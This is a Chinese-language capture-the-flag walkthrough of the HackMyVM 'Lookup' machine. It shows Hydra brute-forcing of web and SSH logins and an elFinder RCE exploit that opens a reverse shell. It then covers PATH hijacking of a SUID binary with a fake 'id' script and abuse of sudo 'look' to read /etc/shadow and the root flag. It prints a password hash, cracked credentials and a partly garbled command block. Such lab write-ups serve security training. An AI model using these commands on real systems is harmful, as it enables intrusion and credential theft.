---
title: HMV-Lookup
description: Enjoy it.
pubDate: 17 01 2026
image: /mechine/Lookup.jpg
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux
---

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768617276832-0f4fe3a4-e598-40bf-857d-7c984ac6d003.png)

# 信息收集
## IP定位
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"

192.168.0.103   08:00:27:61:e7:ab       (Unknown)
```

## rustscan扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# rustscan -a 192.168.0.103 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.103:22
Open 192.168.0.103:80

Nmap scan report for 192.168.0.103
Host is up, received arp-response (0.00041s latency).
Scanned at 2026-01-16 21:30:16 EST for 7s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://lookup.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:61:E7:AB (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/16%OT=22%CT=%CU=34239%PV=Y%DS=1%DC=D%G=N%M=080027
OS:%TM=696AF43F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II
OS:=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7
OS:%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%
OS:W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
OS:I=N%T=40%CD=S)

Uptime guess: 27.477 days (since Sat Dec 20 10:03:10 2025)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.0.103

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:30
Completed NSE at 21:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:30
Completed NSE at 21:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:30
Completed NSE at 21:30, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
           Raw packets sent: 25 (1.894KB) | Rcvd: 17 (1.366KB)
```

## 添加hosts
```plain
192.168.0.103 lookup.hmv
```

## 目录扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/RunasCs]
└─# gobuster dir -u http://lookup.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.hmv
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,db,bak,js,yaml,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/login.php            (Status: 200) [Size: 1]
/index.php            (Status: 200) [Size: 719]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1985031 / 1985040 (100.00%)
===============================================================
Finished
===============================================================

```

### [http://lookup.hmv/](http://lookup.hmv/)index.php
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768617988005-d09f43a5-b3b9-4c45-bfb2-db5b0ba4cd47.png)

```plain
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <form action="login.php" method="post">
      <h2>Login</h2>
      <div class="input-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
```

### 利用失败
尝试sql注入

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# sqlmap -r post --batch                          
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.11#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:57:34 /2026-01-16/

[21:57:34] [INFO] parsing HTTP request from 'post'
[21:57:34] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'http://lookup.hmv'. Do you want to apply it from now on? [Y/n] Y
[21:57:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:57:34] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] Y
[21:57:34] [WARNING] please consider usage of tamper scripts (option '--tamper')
[21:57:34] [INFO] testing if the target URL content is stable
[21:57:35] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'                                                                      
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[21:57:35] [INFO] searching for dynamic content
[21:57:35] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)
[21:57:35] [WARNING] target URL content appears to be too dynamic. Switching to '--text-only'                                                                             
[21:57:35] [INFO] testing if POST parameter 'username' is dynamic
[21:57:35] [INFO] POST parameter 'username' appears to be dynamic
[21:57:35] [INFO] testing for SQL injection on POST parameter 'username'
[21:57:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:57:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:57:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                      
[21:57:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:57:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                     
[21:57:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:57:35] [INFO] testing 'Generic inline queries'
[21:57:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:57:35] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:57:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                                  
[21:57:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:57:35] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[21:57:35] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[21:57:35] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[21:57:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[21:57:35] [WARNING] POST parameter 'username' does not seem to be injectable
[21:57:35] [INFO] testing if POST parameter 'password' is dynamic
[21:57:35] [INFO] POST parameter 'password' appears to be dynamic
[21:57:35] [INFO] testing for SQL injection on POST parameter 'password'
[21:57:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:57:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:57:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                      
[21:57:36] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:57:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                     
[21:57:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:57:36] [INFO] testing 'Generic inline queries'
[21:57:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:57:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:57:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                                  
[21:57:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:57:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[21:57:36] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[21:57:36] [INFO] testing 'Oracle AND time-based blind'
[21:57:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[21:57:36] [WARNING] POST parameter 'password' does not seem to be injectable
[21:57:36] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'                                                                      
[21:57:36] [WARNING] your sqlmap version is outdated

[*] ending @ 21:57:36 /2026-01-16/
```

### 爆破用户和密码
```plain
hydra [选项] <目标> http-post-form "<路径>:<POST数据>:<失败特征>"
```

`http-post-form`**必须是 3 段，用冒号分隔**：

```plain
URI : POST数据 : 失败特征
```

```plain
┌──(kali💀kali)-[~/temp/Lookup]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f lookup.hmv http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-23 05:37:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://lookup.hmv:80/login.php:username=^USER^&password=^PASS^:Wrong password
[80][http-post-form] host: lookup.hmv   login: admin   password: password123
[STATUS] attack finished for lookup.hmv (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

 尝试去看一下这个地址：  

```plain
┌──(kali💀kali)-[~/temp/Lookup]
└─$ curl http://lookup.hmv/login.php -X POST -d "username=admin&password=aaaa"
Wrong password. Please try again.<br>Redirecting in 3 seconds.                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/Lookup]
└─$ curl http://lookup.hmv/login.php -X POST -d "username=admin&password=password123"
Wrong username or password. Please try again.<br>Redirecting in 3 seconds.
```

 说明用户名不对，重新爆破一下：  

```plain
┌──(kali💀kali)-[~/temp/Lookup]
└─$ hydra -p password123 -L /usr/share/wordlists/rockyou.txt -f lookup.hmv http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-23 05:40:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:14344399/p:1), ~896525 tries per task
[DATA] attacking http-post-form://lookup.hmv:80/login.php:username=^USER^&password=^PASS^:Wrong username
[STATUS] 4455.00 tries/min, 4455 tries in 00:01h, 14339944 to do in 53:39h, 16 active
[80][http-post-form] host: lookup.hmv   login: jose   password: password123
[STATUS] attack finished for lookup.hmv (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

登录发现重定向至files.lookup.hmv

![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768621681466-06eb7edf-288e-466b-93b1-c4631c8018af.png)

## 添加hosts
```plain
192.168.0.103 files.lookup.hmv
```

## [files.lookup.hmv](http://files.lookup.hmv/elFinder/elfinder.html)
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768621780529-594dfdae-87ac-47c8-8220-dd00160b2fd7.png)

### elfinder 漏洞
![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768621996813-865cee7e-3a28-44b9-b7a9-ebdff6def2d3.png)

[https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce](https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce)

```plain
python3 exploit.py -t 'http://files.lookup.hmv/elFinder' -lh 192.168.0.106 -lp 4444
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# pwncat-cs -lp 4444
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/zodburi/__init__.py:2: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import iter_entry_points
[22:56:17] Welcome to pwncat 🐈!                                                                    __main__.py:164
[22:56:21] received connection from 192.168.0.103:51572                                                  bind.py:84
[22:56:22] 192.168.0.103:51572: registered new host w/ db                                            manager.py:957
(local) pwncat$ back
(remote) www-data@lookup:/var/www/files.lookup.hmv/public_html/elFinder/php$ 
```

# 提权
## 提权-think
```plain
(remote) www-data@lookup:/home/think$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

### /usr/sbin/pwm
```plain
(remote) www-data@lookup:/home/think$ strings /usr/sbin/pwm
/lib64/ld-linux-x86-64.so.2
libc.so.6
fopen
perror
puts
__stack_chk_fail
putchar
popen
fgetc
__isoc99_fscanf
fclose
pclose
__cxa_finalize
__libc_start_main
snprintf
GLIBC_2.4
GLIBC_2.7
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
[!] Running 'id' command to extract the username and user ID (UID)
[-] Error executing id command
uid=%*u(%[^)])
[-] Error reading username from id command
[!] ID: %s
/home/%s/.passwords
[-] File /home/%s/.passwords not found
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
pwm.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
putchar@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__isoc99_fscanf@@GLIBC_2.7
puts@@GLIBC_2.2.5
_edata
fclose@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
pclose@@GLIBC_2.2.5
snprintf@@GLIBC_2.2.5
fgetc@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
popen@@GLIBC_2.2.5
fopen@@GLIBC_2.2.5
perror@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

+ 它尝试运行`id`命令来获取用户名和UID
+ 它寻找文件`/home/%s/.passwords`（%s是用户名）
+ 如果文件不存在，会显示错误信息"[-] File /home/%s/.passwords not found"

这个程序可能是一个自定义的程序，用于管理密码。由于它是SUID root，我们可以尝试利用它。

```plain
(remote) www-data@lookup:/home/think$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

```plain
1. popen("id", "r")
2. 从 id 输出中解析：
   uid=XXXX(username)
3. 得到 username
4. 拼路径：
   /home/<username>/.passwords
5. fopen 这个文件
6. 逐字符读取并打印
```

程序使用`popen()`来执行`id`命令。这意味着我们可以尝试通过环境变量`PATH`来劫持`id`命令，从而控制其输出。  
我们可以创建一个恶意的`id`脚本，让它输出我们想要的用户名，比如`root`，这样程序就会去读取`/root/.passwords`文件。

```plain
echo 'echo "uid=0((remote) www-data@lookup:/tmp$ echo 'echo "uid=0(root) gid=0(root) groups=0(root)"' >> id
(remote) www-data@lookup:/tmp$ chmod +x id
(remote) www-data@lookup:/tmp$ export PATH=/tmp:$PATH
(remote) www-data@lookup:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: root
[-] File /home/root/.passwords not found
(remote) www-data@lookup:/tmp$ /tmp/rootbash -p
www-data@lookup:/tmp$ 
```

> echo "uid=1000(think) gid=1000(think) groups=1000(think)"
>
> 它的作用是：
>
>     把这串字符串
>
>     原样写到 stdout
>
>     让 pwm 通过 fscanf() 成功解析
>

####  fake `id` 本质上是一个“程序”
你现在创建的是：

```plain
/tmp/id
```

当 `pwm` 执行：

```plain
popen("id", "r")
```

系统做的是：

```plain
/tmp/id
```

👉 **那它期望什么？**

答案：

**期望这个程序在 stdout 上打印一行类似 **`**id**`** 的输出**

---

#### 如果不写 `echo` 会发生什么？
假设你这样写：

```plain
cat > id << 'EOF'
uid=1000(think) gid=1000(think)
EOF
```

那 `/tmp/id` 实际内容是：

```plain
uid=1000(think) gid=1000(think)
```

执行时会发生什么？

+ shell 尝试把 `uid=1000(think)` 当命令
+ ❌ 命令不存在
+ ❌ 没有任何 stdout 输出

```plain
cd /tmp
cat > id << 'EOF'
echo "uid=1000(think) gid=1000(think) groups=1000(think)"
EOF

chmod +x id
export PATH=/tmp:$PATH
www-data@lookup:/tmp$ /usr/sbin/pwm
```

```plain
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

### ssh爆破
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# hydra -l think -P passwd ssh://192.168.0.103              
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-16 23:26:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://192.168.0.103:22/
[22][ssh] host: 192.168.0.103   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-16 23:26:34
```

得到凭据think/josemario.AKA(think)

```plain
think@lookup:~$ cat user.txt 
38375fb4dd8baa2b2039ac03d92b820e
```

## 提权-root
```plain
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

```plain
think@lookup:~$ strings /usr/bin/look
/lib64/ld-linux-x86-64.so.2
libbsd.so.0
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
errc
libc.so.6
exit
setlocale
mbrtowc
towlower
optind
__stack_chk_fail
putchar
iswalnum
mmap
strlen
wcschr
malloc
optarg
stderr
getopt_long
fwrite
close
open
__cxa_finalize
errx
strerror
__libc_start_main
__fxstat
LIBBSD_0.0
GLIBC_2.4
GLIBC_2.2.5
AWAVAUATI
|$(1
L$(I
t$,H
tyH9
u+UH
AWAVAUATUSH
tTA9
tPI9
([]A\A]A^A_
[]A\A]A^A_
usage: look [-bdf] [-t char] string [file ...]
invalid termination character
+abdft:
%s: %s
stdout
alternative
binary
alphanum
ignore-case
terminate
:*3$"
/usr/share/dict/words
2d6cbfbc09e5ed78ae212ab4e9ef693c5ed04f.debug
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.gnu_debuglink

```

`sudo` 允许你以 **root** 身份运行 `/usr/bin/look`  
而 **look 可以读取任意文件内容**  
👉 **直接 sudo look 读 **`**/etc/shadow**`** / root flag / root shell**

**sudo look '' file**

** **👉** 等价于：打印文件中的所有行（≈ cat）  
**👉** 前提：look 的实现允许空字符串作为匹配前缀**

### `look` 的本质逻辑是：
**打印 ****以 STRING 开头的行**

**在字符串匹配理论里：**

```plain
任意字符串 都是 以 ""（空字符串）开头的
```

### 读取/etc/shadow
```plain
think@lookup:~$ sudo /usr/bin/look root /etc/shadow
root:$6$KP40TGoPGcMkX5td$L2jPqII/YjqUc5Ibisj4PFWNs8qtTaG6vNWOQ7v6ShPq5y/qeAmBoWgJrQnvcXUSYzYkqLdwqIcGZRBvhWc7y.:19977:0:99999:7:::
```

### 读取/root/root.txt
sudo /usr/bin/look root /root/root.txt

没有读到，看来不是以root开头

写个脚本

```plain
think@lookup:/tmp$ nano find_flag.sh

#!/bin/bash

FILE="/root/root.txt"

for c in {A..Z} {a..z} {0..9} \{ \} _ -; do
    echo "[*] Trying '$c'"
    sudo /usr/bin/look "$c" "$FILE" && break
done

think@lookup:/tmp$ chmod +x find_flag.sh
```

```plain
think@lookup:/tmp$ ./find_flag.sh
[*] Trying 'A'
[*] Trying 'B'
[*] Trying 'C'
[*] Trying 'D'
[*] Trying 'E'
[*] Trying 'F'
[*] Trying 'G'
[*] Trying 'H'
[*] Trying 'I'
[*] Trying 'J'
[*] Trying 'K'
[*] Trying 'L'
[*] Trying 'M'
[*] Trying 'N'
[*] Trying 'O'
[*] Trying 'P'
[*] Trying 'Q'
[*] Trying 'R'
[*] Trying 'S'
[*] Trying 'T'
[*] Trying 'U'
[*] Trying 'V'
[*] Trying 'W'
[*] Trying 'X'
[*] Trying 'Y'
[*] Trying 'Z'
[*] Trying 'a'
[*] Trying 'b'
[*] Trying 'c'
[*] Trying 'd'
[*] Trying 'e'
[*] Trying 'f'
[*] Trying 'g'
[*] Trying 'h'
[*] Trying 'i'
[*] Trying 'j'
[*] Trying 'k'
[*] Trying 'l'
[*] Trying 'm'
[*] Trying 'n'
[*] Trying 'o'
[*] Trying 'p'
[*] Trying 'q'
[*] Trying 'r'
[*] Trying 's'
[*] Trying 't'
[*] Trying 'u'
[*] Trying 'v'
[*] Trying 'w'
[*] Trying 'x'
[*] Trying 'y'
[*] Trying 'z'
[*] Trying '0'
[*] Trying '1'
[*] Trying '2'
[*] Trying '3'
[*] Trying '4'
[*] Trying '5'
5a285a9f257e45c68bb6c9f9f57d18e8
```

```plain
think@lookup:~$ sudo look '' "/root/root.txt"
[sudo] password for think: 
5a285a9f257e45c68bb6c9f9f57d18e8
```





